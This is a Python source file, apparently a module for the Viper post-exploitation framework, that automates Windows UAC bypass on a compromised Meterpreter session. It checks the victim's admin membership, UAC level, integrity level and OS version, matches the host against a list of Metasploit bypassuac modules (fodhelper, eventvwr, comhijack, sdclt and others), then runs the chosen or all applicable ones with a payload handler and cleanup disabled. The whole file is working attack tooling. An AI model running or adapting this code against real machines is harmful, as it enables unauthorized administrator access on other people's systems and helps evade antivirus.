# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "Windows UAC绕过"
    DESC_ZH = "内置多种方式绕过系统UAC获取管理员权限.\n" \
              "自动模式:自动选择绕过技术并执行\n" \
              "手动模式:手动选择某种绕过技术并执行\n" \
              "检测模式:自动检测Sesion适用哪些绕过技术(不执行)\n" \
              "模块需要Session完整性权限为中以上并处于管理员组.\n" \
              "自动模式会运行多个子模块尝试BypassUAC,杀软会拦截.\n" \
              "建议使用检测模式获取适用的子模块列表后,单独手工依次运行."

    NAME_EN = "Windows UAC bypass"
    DESC_EN = "There are many built-in ways to bypass  UAC to obtain administrator privileges.\n" \
              "Automatic mode: automatically select bypass technology and execute\n" \
              "Manual mode: manually select a certain bypass technique and execute it\n" \
              "Detection mode: Automatically detect which bypass technologies Sesion applies (do not execute)\n" \
              "The module needs the session integrity permission to be medium or higher and be in the administrator group.\n" \
              "The automatic mode will run multiple sub-modules to try BypassUAC, and the anti-virus will intercept it.\n" \
              "It is recommended to use the detection mode to obtain a list of applicable submodules, and then run them separately and manually."

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Privilege_Escalation
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator"]  # 所需权限
    ATTCK = ["T1088"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/ygddsl"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1088/"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionEnum(name='module_select',
                   tag_zh="Bypass方法", desc_zh="选择Bypass方法,默认使用所有可利用方法",
                   tag_en="Bypass method", desc_en="Select Bypass method, use all available methods by default",
                   required=True,
                   default='check',
                   enum_list=[
                       {'tag_zh': '检测模式', 'tag_en': 'Check Mode', 'value': 'check'},
                       {'tag_zh': '自动模式', 'tag_en': 'Auto Mode', 'value': 'auto'},
                       {'tag_zh': 'runas', 'tag_en': 'runas', 'value': 'windows/local/bypassuac'},
                       {'tag_zh': 'comhijack', 'tag_en': 'comhijack', 'value': 'windows/local/bypassuac_comhijack'},
                       {'tag_zh': 'dotnet_profiler', 'tag_en': 'dotnet_profiler',
                        'value': 'windows/local/bypassuac_dotnet_profiler'},
                       {'tag_zh': 'eventvwr', 'tag_en': 'eventvwr', 'value': 'windows/local/bypassuac_eventvwr'},
                       {'tag_zh': 'fodhelper', 'tag_en': 'fodhelper', 'value': 'windows/local/bypassuac_fodhelper'},
                       {'tag_zh': 'injection', 'tag_en': 'injection', 'value': 'windows/local/bypassuac_injection'},
                       {'tag_zh': 'injection_winsxs', 'tag_en': 'injection_winsxs',
                        'value': 'windows/local/bypassuac_injection_winsxs'},
                       {'tag_zh': 'sdclt', 'tag_en': 'sdclt', 'value': 'windows/local/bypassuac_sdclt'},
                       {'tag_zh': 'silentcleanup', 'tag_en': 'silentcleanup',
                        'value': 'windows/local/bypassuac_silentcleanup'},
                       {'tag_zh': 'sluihijack', 'tag_en': 'sluihijack', 'value': 'windows/local/bypassuac_sluihijack'},
                       {'tag_zh': 'vbs', 'tag_en': 'vbs', 'value': 'windows/local/bypassuac_vbs'},
                   ]),
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.session = None
        self.module_path_list = []

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid, rightinfo=True, uacinfo=True)
        self.session = session
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        # 检查权限
        if session.is_admin or session.is_system:
            return False, "当前Session已获取管理员权限,无需执行模块", "The current Session has obtained administrator rights, no need to execute the module"
        if session.is_in_admin_group is not True:
            return False, "当前Session用户不在管理员组中,无法执行模块", "The current session user is not in the administrator group and cannot execute the module"
        # 检查UAC设置
        if session.is_uac_enable is not True:
            return False, "当前Session用户所在主机未开启UAC或UAC情况未知,无需执行模块", "The current session user's host has not enabled UAC or the UAC situation is unknown, no need to execute the module"
        if session.uac_level in [UACLevel.UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
                                 UACLevel.UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
                                 UACLevel.UAC_PROMPT_CREDS,
                                 UACLevel.UAC_PROMPT_CONSENT]:
            return False, "当前Session用户设置的UAC级别为过高,无法执行模块", "The UAC level set by the current session user is too high to execute the module"
        # 检查integrity_level
        if session.integrity is None or session.integrity == 'low':
            return False, "当前Session的完整性级别过低,无法执行模块", "The integrity level of the current session is too low to execute the module"

        flag = self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"

        # 检查handler和arch是否对应
        host_arch = session.arch
        try:
            if host_arch == 'x64':
                if 'x64' not in self.opts.get('PAYLOAD'):
                    return False, "选择handler的arch错误,请选择x64平台的handler", "The arch error of the selected handler, please select the handler of the x64 platform"
            else:
                if 'x64' in self.opts.get('PAYLOAD'):
                    return False, "选择handler的arch错误,请选择x86平台的handler", "Select the arch error of the handler, please select the handler of the x86 platform"
        except Exception as E:
            return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"

        # 通过适用的操作系统进行正则匹配
        host_os = session.os

        re_list = [
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_comhijack',
             'os_re': 'Windows (7|8|10|2008|2012|2016)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_dotnet_profiler',
             'os_re': 'Windows (7|8|2008|2012|10)',
             "arch_list": ["x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_eventvwr',
             'os_re': 'Windows (7|8|2008|2012|10)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_fodhelper',
             'os_re': 'Windows (10)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_injection',
             'os_re': 'Windows (7|8|2008|2012|10)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_injection_winsxs',
             'os_re': 'Windows (8|10)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_sdclt',
             'os_re': 'Windows (Vista|7|8|2008|2012|2016|10)',
             "arch_list": ["x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_silentcleanup',
             'os_re': 'Windows (Vista|7|8|2008|2012|2016|10)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_sluihijack',
             'os_re': 'Windows (8|10)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac_vbs',
             'os_re': 'Windows (7|2008)',
             "arch_list": ["x86", "x64"],
             },
            {'type': 'exploit',
             'mname': 'windows/local/bypassuac',
             'os_re': 'Windows Vista|Windows 2008|Windows [78]',
             "arch_list": ["x86", "x64"],
             },
        ]
        import re
        for one in re_list:
            if re.search(one.get('os_re'), host_os) is not None:
                if host_arch in one.get('arch_list'):
                    self.module_path_list.append(one)

        if len(self.module_path_list) == 0:
            return False, "未找到符合要求的模块,退出执行", "No module that meets the requirements is found, exit execution"

        module_select = self.param('module_select')
        tmprecord = None
        if module_select != 'auto' and module_select != "check":  # 不是自动模式
            for one in self.module_path_list:
                if one.get('mname') == module_select:
                    tmprecord = [one]
            if tmprecord is None:
                return False, "选择的Bypass方法不符合Session要求,退出执行", "The selected Bypass method does not meet the Session requirements, exit execution"
            else:
                self.module_path_list = tmprecord
        self.opts["SESSION"] = self._sessionid

        return True, None

    def run(self):
        # 设置参数
        flag = self.set_payload_by_handler()
        self.opts['TECHNIQUE'] = 'PSH'
        self.opts['AllowNoCleanup'] = True

        host_arch = self.session.arch
        if host_arch == 'x64':
            self.opts['target'] = 1
        else:
            self.opts['target'] = 0

        if self.param('module_select') == "check":  # 只检测,不执行
            self.log_good(f"存在 {len(self.module_path_list)} 个符合要求的模块",
                          f"There are {len(self.module_path_list)} modules that meet the requirements")
            for one in self.module_path_list:
                self.log_good(one.get('mname'), one.get('mname'))
        else:
            self.log_good(f"存在 {len(self.module_path_list)} 个符合要求的模块,准备执行",
                          f"There are {len(self.module_path_list)} modules that meet the requirements, ready to execute")
            # 运行模块
            for one in self.module_path_list:
                self.log_info(f"正在执行 {one.get('mname')}", f"Executing {one.get('mname')}")
                MsfModule.run_with_output(module_type=one.get('type'), mname=one.get('mname'), opts=self.opts)
                self.log_info("等待30秒", "Wait 30 seconds")
                time.sleep(30)
            # 调用父类函数存储结果(必须调用)
            self.log_info("执行完成,请查看新生成Session的权限",
                          "The execution is complete, please check the permissions of the newly generated Session")
